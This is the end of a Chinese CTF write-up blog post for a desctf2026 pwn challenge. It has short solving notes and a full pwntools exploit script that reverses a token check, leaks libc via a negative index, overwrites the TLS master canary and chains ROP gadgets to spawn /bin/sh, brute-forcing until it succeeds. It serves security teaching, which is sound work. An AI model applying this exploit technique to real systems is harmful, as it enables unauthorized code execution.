+<p><img src="/images/desctf2026/1772953451207-7b0c20de-7ff0-4753-9ba1-a73253d3642b.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/desctf2026/1772953508834-965cc05d-c87d-40a4-987d-8f840385d3ea.png" srcset="/img/loading.gif" lazyload></p>
+<p>何意位</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/desctf2026/1772956554090-88f50114-6a3d-4c53-8d01-519447eb9257.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/desctf2026/1772956858238-e30cf527-ed7c-4837-aa0f-87d972638a28.png" srcset="/img/loading.gif" lazyload></p>
+<p>有rw权限</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/desctf2026/1772957350438-a27a2826-1eb6-4c8b-aac3-e9da93949ac5.png" srcset="/img/loading.gif" lazyload></p>
+<p>日</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/desctf2026/1772959392766-fb8bd91f-ca56-4632-a29d-348830e0afd6.png" srcset="/img/loading.gif" lazyload></p>
+<p>还是不行，mmap出来的addr与libc.base之间的offset不固定</p>
+<p>得让attachment强制执行‘.&#x2F;libc.so.6’</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/desctf2026/1772961651707-82f95a9d-8ef8-40eb-8f96-2783390808bf.png" srcset="/img/loading.gif" lazyload></p>
+<p>这个方法不行，用pwninit就可以了</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/desctf2026/1772972578805-dc0b1956-f8df-4306-8f82-4dc73c09008a.png" srcset="/img/loading.gif" lazyload></p>
+<p>ok，下断点调试过了</p>
+<p>这个leak方法不行</p>
+<p>leak libc 也是看运气，mmap 0x10000 chunk和asrl会使offset变化</p>
+<p>我得换一个</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/desctf2026/1772983330705-a285826d-97f4-48b1-9f4f-04a960fb2392.png" srcset="/img/loading.gif" lazyload></p>
+<p>ok, 通过-index 可以leak libc_base,还是稳定的</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/desctf2026/1772988611685-c7673228-1dd0-4e95-88ed-29adf460ed2a.png" srcset="/img/loading.gif" lazyload></p>
+<p>试了几回，没错</p>
+<p>我在找找办法leak fs</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/desctf2026/1772989962563-227dd733-a819-444e-970a-23f37dab7ab3.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/desctf2026/1772990030362-cc178780-14b3-4d00-b7a2-9aebe96b50e8.png" srcset="/img/loading.gif" lazyload></p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/desctf2026/1772990045169-df673094-7db2-4c1a-882c-3d1446cbfd6e.png" srcset="/img/loading.gif" lazyload></p>
+<p>这个可以稳定leak envrion</p>
+<p>好的，envrion没什么用</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/desctf2026/1773053630913-5efa3601-73eb-4eef-8949-7612413deb65.png" srcset="/img/loading.gif" lazyload></p>
+<p>现在的问题是fs的地址有0x100000到0x500000的随机偏移（单位为0x1000)</p>
+<p>也就是说libc_base和fs_base之间的offset是不固定的</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/desctf2026/1773053823595-6a922668-284f-4dee-abb2-e2514b216347.png" srcset="/img/loading.gif" lazyload></p>
+<p>但fs_base相对于它的内存页的offset是固定的0x740</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="/images/desctf2026/1773057162291-88100eb2-b768-4d24-9451-6dc1620b5901.png" srcset="/img/loading.gif" lazyload></p>
+<p>找不到稳定的方式去leak，只能爆了</p>
+<p>远程固定的offset爆的应该更快</p>
+<p>后面的循环直接让ai改了，不想一个一个Tab</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><code class="hljs plain">from pwn import *<br><br>context.binary = &#x27;./attachment_patched&#x27;<br>context.log_level = &#x27;info&#x27; <br><br>libc = ELF(&#x27;./libc.so.6&#x27;, checksec=False) #clear<br><br>sbox = [<br>    0x52, 0x09, 0x6a, 0xd5, 0x30, 0x36, 0xa5, 0x38, 0xbf, 0x40, 0xa3, 0x9e, 0x81, 0xf3, 0xd7, 0xfb,<br>    0x7c, 0xe3, 0x39, 0x82, 0x9b, 0x2f, 0xff, 0x87, 0x34, 0x8e, 0x43, 0x44, 0xc4, 0xde, 0xe9, 0xcb,<br>    0x54, 0x7b, 0x94, 0x32, 0xa6, 0xc2, 0x23, 0x3d, 0xee, 0x4c, 0x95, 0x0b, 0x42, 0xfa, 0xc3, 0x4e,<br>    0x08, 0x2e, 0xa1, 0x66, 0x28, 0xd9, 0x24, 0xb2, 0x76, 0x5b, 0xa2, 0x49, 0x6d, 0x8b, 0xd1, 0x25,<br>    0x72, 0xf8, 0xf6, 0x64, 0x86, 0x68, 0x98, 0x16, 0xd4, 0xa4, 0x5c, 0xcc, 0x5d, 0x65, 0xb6, 0x92,<br>    0x6c, 0x70, 0x48, 0x50, 0xfd, 0xed, 0xb9, 0xda, 0x5e, 0x15, 0x46, 0x57, 0xa7, 0x8d, 0x9d, 0x84,<br>    0x90, 0xd8, 0xab, 0x00, 0x8c, 0xbc, 0xd3, 0x0a, 0xf7, 0xe4, 0x58, 0x05, 0xb8, 0xb3, 0x45, 0x06,<br>    0xd0, 0x2c, 0x1e, 0x8f, 0xca, 0x3f, 0x0f, 0x02, 0xc1, 0xaf, 0xbd, 0x03, 0x01, 0x13, 0x8a, 0x6b,<br>    0x3a, 0x91, 0x11, 0x41, 0x4f, 0x67, 0xdc, 0xea, 0x97, 0xf2, 0xcf, 0xce, 0xf0, 0xb4, 0xe6, 0x73,<br>    0x96, 0xac, 0x74, 0x22, 0xe7, 0xad, 0x35, 0x85, 0xe2, 0xf9, 0x37, 0xe8, 0x1c, 0x75, 0xdf, 0x6e,<br>    0x47, 0xf1, 0x1a, 0x71, 0x1d, 0x29, 0xc5, 0x89, 0x6f, 0xb7, 0x62, 0x0e, 0xaa, 0x18, 0xbe, 0x1b,<br>    0xfc, 0x56, 0x3e, 0x4b, 0xc6, 0xd2, 0x79, 0x20, 0x9a, 0xdb, 0xc0, 0xfe, 0x78, 0xcd, 0x5a, 0xf4,<br>    0x1f, 0xdd, 0xa8, 0x33, 0x88, 0x07, 0xc7, 0x31, 0xb1, 0x12, 0x10, 0x59, 0x27, 0x80, 0xec, 0x5f,<br>    0x60, 0x51, 0x7f, 0xa9, 0x19, 0xb5, 0x4a, 0x0d, 0x2d, 0xe5, 0x7a, 0x9f, 0x93, 0xc9, 0x9c, 0xef,<br>    0xa0, 0xe0, 0x3b, 0x4d, 0xae, 0x2a, 0xf5, 0xb0, 0xc8, 0xeb, 0xbb, 0x3c, 0x83, 0x53, 0x99, 0x61,<br>    0x17, 0x2b, 0x04, 0x7e, 0xba, 0x77, 0xd6, 0x26, 0xe1, 0x69, 0x14, 0x63, 0x55, 0x21, 0x0c, 0x7d<br>]<br>a3 = [0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, 0xBA, 0xBE, 0x13, 0x37, 0xC0, 0xDE, 0xFE, 0xED, 0xFA, 0xCE]<br>inv_sbox = &#123;v: i for i, v in enumerate(sbox)&#125;<br><br>def ror(val, amt):<br>    return ((val &gt;&gt; amt) | (val &lt;&lt; (8 - amt))) &amp; 0xFF<br><br>def show_chunk(io, idx):<br>    io.sendlineafter(b&quot;&gt;&gt; &quot;, b&quot;4&quot;)<br>    io.sendlineafter(b&quot;[*] Index: &quot;, str(idx).encode())<br><br>def attempt_exploit(attempt_num):<br>    io = process(&#x27;./attachment_patched&#x27;, level=&#x27;error&#x27;) #clear<br>    <br>    try:<br>        #Reverse<br>        io.recvuntil(b&quot;[*] Challenge (hex): &quot;)<br>        challenge_hex = io.recvline().strip().decode()<br>        data = list(bytes.fromhex(challenge_hex))<br>        for m in range(16):<br>            data[m] = inv_sbox[data[m]]<br>            data[m] ^= (m + a3[m]) &amp; 0xFF<br>        for k in range(7, -1, -1):<br>            curr_k, curr_15k = data[k], data[15-k]<br>            data[15-k] = curr_k ^ a3[(k + 3) % 16]<br>            data[k] = curr_15k ^ a3[(18 - k) % 16]<br>        for j in range(16):<br>            data[j] ^= a3[(j + 7) % 16]<br>            data[j] = ror(data[j], 3)<br>        for i in range(16):<br>            data[i] = inv_sbox[data[i]]<br>            data[i] ^= a3[i]<br>        io.sendlineafter(b&quot;[*] Enter your  token: &quot;, bytes(data))<br><br>        # Leak Libc<br>        show_chunk(io, -32) <br>        io.recvuntil(b&#x27;[*] Chunk -32 at &#x27;)<br>        leak_addr = int(io.recvuntil(b&quot; &quot;)[:-1], 16)   <br>        io.recvuntil(b&#x27;6. Exit\n&#x27;)<br>        <br>        base_addr = leak_addr - 0x80e50<br>        libc.address = base_addr<br>        master_canary_addr = libc.address + 0x371740 + 0x28<br>        #print(f&quot;Calculated master canary address: &#123;hex(master_canary_addr)&#125;&quot;)<br>        #print(f&quot;Calculated libc base: &#123;hex(libc.address)&#125;&quot;)<br>        <br><br>        # ROP<br>        rop = ROP(libc)<br>        pop_rdi = rop.find_gadget([&#x27;pop rdi&#x27;, &#x27;ret&#x27;])[0]<br>        ret = rop.find_gadget([&#x27;ret&#x27;])[0] <br>        bin_sh = next(libc.search(b&#x27;/bin/sh\x00&#x27;))<br>        system = libc.sym[&#x27;system&#x27;]<br><br>        payload = p64(master_canary_addr)<br>        payload = payload.ljust(0x48, b&quot;A&quot;)<br>        payload += p64(0) + p64(0xdeadbeef) <br>        payload += p64(ret) + p64(pop_rdi) + p64(bin_sh) + p64(system)<br><br>        io.sendline(b&quot;5&quot;)<br>        io.sendlineafter(b&#x27;[*] Enter debug data &#x27;, payload)<br>        io.sendline(b&quot;echo PWNED&quot;)<br>        result = io.recvuntil(b&quot;PWNED&quot;, timeout=0.5)<br>        <br>        if b&quot;PWNED&quot; in result:<br>            log.success(f&quot;\n[+] Exploit Succeeded on Attempt &#123;attempt_num&#125;!&quot;)<br>            log.success(f&quot;Libc base: &#123;hex(libc.address)&#125;&quot;)<br>            log.success(f&quot;Hit Master Canary at: &#123;hex(master_canary_addr)&#125;&quot;)<br>            io.interactive()<br>            return True<br><br>    except EOFError:<br>        pass<br>    except Exception as e:<br>        pass<br>    # clear<br>    io.close()<br>    return False<br>if __name__ == &quot;__main__&quot;:<br>    log.info(&quot;Starting Bruteforce for fixed TLS offset (0x371740)...&quot;)<br>    attempt = 1<br>    <br>    while True:<br>        # 每爆破 20 次打印一次进度条，防止不知道跑到哪了<br>        if attempt % 20 == 0:<br>            log.info(f&quot;Running attempt &#123;attempt&#125;...&quot;)<br>            <br>        if attempt_exploit(attempt):<br>            break<br>            <br>        attempt += 1<br></code></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<h1 id="ezmail"><a href="#ezmail" class="headerlink" title="ezmail"></a>ezmail</h1>
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/desctf-Writeup/" class="category-chain-item">desctf Writeup</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Pwn/" class="print-no-link">#Pwn</a>
+      
+        <a href="/tags/rop/" class="print-no-link">#rop</a>
+      
+        <a href="/tags/canary-leak/" class="print-no-link">#canary_leak</a>
+      
+        <a href="/tags/index/" class="print-no-link">#-index</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>desctf2026</div>
+      <div>https://ghostshark-pro.github.io/2026/03/20/desctf2026/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>shark</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted</div>
+          <div>2026年3月20日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>License</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2026/04/23/glibc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90-_2.23/" title="glibc源码分析-_2.23">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">glibc源码分析-_2.23</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/12/28/ciscn2025/" title="ciscn2025">
+                        <span class="hidden-mobile">ciscn2025</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>TOC</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+  
+  
+
+
+
+
+
+  <script>
+  Fluid.utils.createScript('https://lib.baomitu.com/mermaid/8.14.0/mermaid.min.js', function() {
+    mermaid.initialize({"theme":"default"});
+
+    Fluid.utils.listenDOMLoaded(function() {
+      Fluid.events.registerRefreshCallback(function() {
+        if ('mermaid' in window) {
+          mermaid.init();
+        }
+      });
+    });
+  });
+</script>
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Grep</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    function isExpandAllEnabled() {
+      return CONFIG.toc && CONFIG.toc.expand_all === true;
+    }
+    function expandAllToc() {
+      if (!isExpandAllEnabled()) { return; }
+      jQuery('#toc-body .tocbot-is-collapsed').removeClass('tocbot-is-collapsed');
+    }
+    function updateTocToggle($li, $childList) {
+      var $toggle = $li.children('.toc-toggle');
+      if ($toggle.length === 0) { return; }
+      var collapsed = $childList.hasClass('tocbot-is-collapsed');
+      $toggle
+        .toggleClass('toc-toggle-collapsed', collapsed)
+        .toggleClass('toc-toggle-expanded', !collapsed);
+    }
+    function bindTocToggle() {
+      if (!isExpandAllEnabled()) { return; }
+      jQuery('#toc-body .toc-list-item').each(function() {
+        var $li = jQuery(this);
+        var $childList = $li.children('ol');
+        if ($childList.length === 0) {
+          if ($li.children('.toc-toggle').length === 0) {
+            $li.prepend('<span class="toc-toggle toc-toggle-placeholder" aria-hidden="true">›</span>');
+          }
+          return;
+        }
+
+        if ($li.children('.toc-toggle').length === 0) {
+          $li.prepend('<span class="toc-toggle toc-toggle-expanded" aria-hidden="true">›</span>');
+        }
+        updateTocToggle($li, $childList);
+      });
+      jQuery('#toc-body').off('click.tocToggle').on('click.tocToggle', '.toc-toggle', function(e) {
+        e.preventDefault();
+        e.stopPropagation();
+        var $li = jQuery(this).parent('.toc-list-item');
+        var $childList = $li.children('ol');
+        if ($childList.length === 0) { return; }
+        $childList.toggleClass('tocbot-is-collapsed');
+        updateTocToggle($li, $childList);
+      });
+      if (!window.__tocToggleObserver) {
+        window.__tocToggleObserver = new MutationObserver(function(mutations) {
+          mutations.forEach(function(mutation) {
+            if (mutation.type !== 'attributes' || mutation.attributeName !== 'class') { return; }
+            var $list = jQuery(mutation.target);
+            var $li = $list.parent('.toc-list-item');
+            if ($li.length === 0) { return; }
+            updateTocToggle($li, $list);
+          });
+        });
+        jQuery('#toc-body ol').each(function() {
+          window.__tocToggleObserver.observe(this, { attributes: true });
+        });
+      }
+    }
+    var tocConfig = Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc);
+    if (isExpandAllEnabled()) {
+      tocConfig.collapseDepth = 6;
+    }
+    window.tocbot.init(tocConfig);
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+    expandAllToc();
+    bindTocToggle();
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+        expandAllToc();
+        bindTocToggle();
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  
+      <script>
+        if (!window.MathJax) {
+          window.MathJax = {
+            tex    : {
+              inlineMath: { '[+]': [['$', '$']] }
+            },
+            loader : {
+              load: ['ui/lazy']
+            },
+            options: {
+              renderActions: {
+                insertedScript: [200, () => {
+                  document.querySelectorAll('mjx-container').forEach(node => {
+                    let target = node.parentNode;
+                    if (target.nodeName.toLowerCase() === 'li') {
+                      target.parentNode.classList.add('has-jax');
+                    }
+                  });
+                }, '', false]
+              }
+            }
+          };
+        } else {
+          MathJax.startup.document.state(0);
+          MathJax.texReset();
+          MathJax.typeset();
+          MathJax.typesetPromise();
+        }
+
+        Fluid.events.registerRefreshCallback(function() {
+          if ('MathJax' in window && MathJax.startup.document && typeof MathJax.startup.document.state === 'function') {
+            MathJax.startup.document.state(0);
+            MathJax.texReset();
+            MathJax.typeset();
+            MathJax.typesetPromise();
+          }
+        });
+      </script>
+    
+
+  <script  src="https://lib.baomitu.com/mathjax/3.2.2/es5/tex-mml-chtml.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+  
+<script src="/js/star.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Please enable JavaScript to render the matrix.</div>
+  </noscript>
+</body>
+</html>
